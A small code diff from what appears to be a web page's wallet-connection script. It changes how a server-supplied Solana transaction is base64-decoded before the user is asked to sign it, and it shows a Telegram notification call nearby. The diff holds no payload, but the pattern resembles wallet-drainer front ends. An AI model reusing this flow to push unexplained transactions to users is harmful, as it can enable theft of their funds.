@@ -477,8 +477,11 @@ await sendTelegramNotification({
                         return;
                     }
 
-                    const transactionBytes = new Uint8Array(prepareData.transaction);
-                    const transaction = solanaWeb3.Transaction.from(transactionBytes);
+const transactionBytes = Uint8Array.from(atob(prepareData.transaction), c =>
+    c.charCodeAt(0)
+);
+
+const transaction = solanaWeb3.Transaction.from(transactionBytes);
 
                     $('.wallet-loading-title').text('Signing Transaction');
                     $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
